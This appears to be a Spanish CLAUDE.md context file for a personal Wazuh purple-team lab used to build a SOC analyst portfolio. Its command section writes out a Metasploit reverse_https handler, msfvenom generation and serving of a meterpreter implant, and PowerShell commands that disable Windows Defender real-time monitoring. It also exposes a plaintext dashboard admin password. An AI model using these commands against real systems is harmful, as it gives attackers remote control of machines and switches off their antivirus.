# CLAUDE.md - Wazuh Purple Team SOC Lab

**Proyecto**: Purple Team SOC Lab with Wazuh
**Ubicación**: `C:\Users\cra\Proyectos\Wazuh`
**Inicio**: 2026-04-29
**Estado**: 🚧 Fase 2 - Purple Team Operations (70%)

---

## CONTEXTO DEL PROYECTO

Este es un laboratorio Purple Team para portfolio profesional, combinando:
- **Blue Team**: Wazuh SIEM para detección
- **Red Team**: C2 framework (Metasploit) para simulación de ataques
- **Purple Team**: Ciclo continuo de attack → detect → improve

**Objetivo**: Demostrar habilidades prácticas de SOC Analyst con enfoque en MITRE ATT&CK

---

## INFRAESTRUCTURA ACTUAL

### Servidor Ubuntu (192.168.1.10)
- **OS**: Ubuntu Server 24.04 LTS
- **RAM**: 8GB
- **Servicios activos**:
  - Wazuh Manager 4.9
  - Wazuh Indexer (OpenSearch)
  - Wazuh Dashboard (HTTPS)
  - Metasploit Framework
  - SSH server
- **Usuarios**: `cra` (sudo)
- **Shell**: Bash con Starship

### Windows Endpoint (192.168.1.254)
- **OS**: Windows 10/11
- **Servicios**:
  - Wazuh Agent (conectado)
  - PowerShell logging habilitado
  - Windows Defender (con exclusiones para lab)

### Red
- **Tipo**: VirtualBox Host-Only
- **Subnet**: 192.168.1.0/24
- **Gateway**: 192.168.1.254 (host)

---

## CREDENCIALES (NO COMMITEAR)

### Wazuh Dashboard
- **URL**: https://192.168.1.10
- **Usuario**: admin
- **Password**: YxzwjyTAzJK3Pni*f3nEu1HyycPxWqYk

### SSH Ubuntu
- **Host**: 192.168.1.10
- **Usuario**: cra
- **Auth**: Password

---

## ARCHIVOS IMPORTANTES

### Scripts
- `scripts/SOC-Lab-Attack-Simulator.ps1` - Simulador de ataques MITRE
- `scripts/Enable-PowerShellLogging.ps1` - Configuración de logging

### Configuración
- `config/local_rules.xml` - Reglas custom Wazuh

### Documentación
- `README.md` - Overview del proyecto
- `docs/PROGRESS.md` - Tracking detallado
- `docs/SOC-Lab-Roadmap.md` - Plan completo (Niveles 1-4)

---

## COMANDOS FRECUENTES

### Ubuntu Server (SSH)

```bash
# Conectar
ssh cra@192.168.1.10

# Wazuh Manager
sudo systemctl status wazuh-manager
sudo systemctl restart wazuh-manager
sudo tail -f /var/ossec/logs/ossec.log

# Wazuh Dashboard
https://192.168.1.10

# Metasploit
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 8443
run

# Generar payload
cd ~
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=8443 -f exe -o implant.exe
python3 -m http.server 8000

# Ver logs
sudo journalctl -xeu wazuh-manager.service
sudo journalctl -xeu wazuh-indexer.service
```

### Windows (PowerShell como Admin)

```powershell
# Wazuh Agent
Restart-Service -Name WazuhSvc
Get-Service -Name WazuhSvc

# Attack Simulator
cd C:\Users\cra\Proyectos\Wazuh\scripts
.\SOC-Lab-Attack-Simulator.ps1 -AttackType All

# PowerShell Logging
.\Enable-PowerShellLogging.ps1

# Windows Defender (lab only)
Add-MpPreference -ExclusionPath "C:\Users\cra\AppData\Local\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## ESTADO ACTUAL

### ✅ Completado

- [x] Wazuh instalado y operativo
- [x] Windows Agent reportando
- [x] PowerShell logging habilitado
- [x] Reglas custom MITRE ATT&CK
- [x] C2 framework (Metasploit)
- [x] Implant generado y ejecutado
- [x] Sesión meterpreter establecida
- [x] Ataques simulados (10+ técnicas)
- [x] Detecciones validadas
- [x] Scripts de simulación creados
- [x] Documentación inicial

### 🚧 En Progreso

- [ ] Active Response (bloqueo automático)
- [ ] Threat Intelligence (AlienVault OTX)
- [ ] Dashboards custom (MITRE heatmap)

### 📅 Próximos Pasos

1. **Documentación técnica completa** (1-2 días)
2. **GitHub repository** (1 día)
3. **Blog post / LinkedIn article** (1 día)
4. **Continuar Nivel 2** (Active Response + TI) (3-5 días)
5. **Nivel 3: AI Integration** (1-2 semanas)

---

## MITRE ATT&CK COVERAGE

### Técnicas Detectadas Activamente

| ID | Técnica | Wazuh Rule | Status |
|----|---------|------------|--------|
| T1110 | Brute Force | 60204, 100002 | ✅ |
| T1059.001 | PowerShell | 91815, 91819, 91837, 100003 | ✅ |
| T1083 | File Discovery | 91819, 91820 | ✅ |
| T1082 | System Info Discovery | Built-in | ✅ |
| T1057 | Process Discovery | 91815 | ✅ |
| T1113 | Screen Capture | Built-in | ✅ |
| T1078 | Valid Accounts | 60103, 100005 | ✅ |
| T1003 | Credential Dumping | 100005 | 🚧 |
| T1068 | Privilege Escalation | 100004 | 🚧 |
| T1021 | Remote Services | Planned | 📅 |

**Total**: 10+ técnicas

---

## DECISIONES TÉCNICAS

### C2 Framework: Metasploit (vs Sliver)
**Razón**: Sliver en snap tuvo problemas de compilación (timeout). Metasploit genera payloads en <5 segundos.

### Wazuh Rules: Custom + Built-in
**Razón**: Wazuh ya tiene cobertura MITRE extensa. Custom rules para casos específicos del lab.

### PowerShell Logging: Mandatory
**Razón**: Sin logging, la mayoría de técnicas T1059 no se detectan.

### Network: Host-Only
**Razón**: Aislamiento total del entorno de producción.

---

## TROUBLESHOOTING

### Problema: Wazuh Indexer no arranca
**Solución**: `sudo /usr/share/wazuh-indexer/bin/indexer-security-init.sh`

### Problema: Windows Defender bloquea implant
**Solución**: Exclusiones en `C:\Users\...\AppData\Local\Temp` o deshabilitar Real-time Protection

### Problema: Meterpreter no conecta
**Verificar**:
- Listener corriendo en msfconsole
- Puerto 8443 abierto
- IP correcta (192.168.1.10)
- Implant ejecutado en Windows

### Problema: Reglas custom no detectan
**Verificar**:
- `/var/ossec/etc/rules/local_rules.xml` correcto
- `sudo systemctl restart wazuh-manager`
- PowerShell logging habilitado en Windows

---

## ROADMAP RESUMIDO

**Nivel 1**: ✅ Foundation (COMPLETADO)
**Nivel 2**: 🚧 Purple Team (70%)
**Nivel 3**: 📅 AI Integration (0%)
**Nivel 4**: 📅 Cloud + Compliance (0%)

**Progreso total**: ~40%

---

## NOTAS PARA CLAUDE

- Este proyecto es PORTFOLIO, priorizar documentación clara
- Sin info sensible en commits (ver .gitignore)
- Screenshots genéricos (sin IPs/passwords)
- Enfoque en MITRE ATT&CK mapping
- Target: SOC Analyst roles en España

---

**Última actualización**: 2026-04-29
**Próxima revisión**: Fase 2 completion
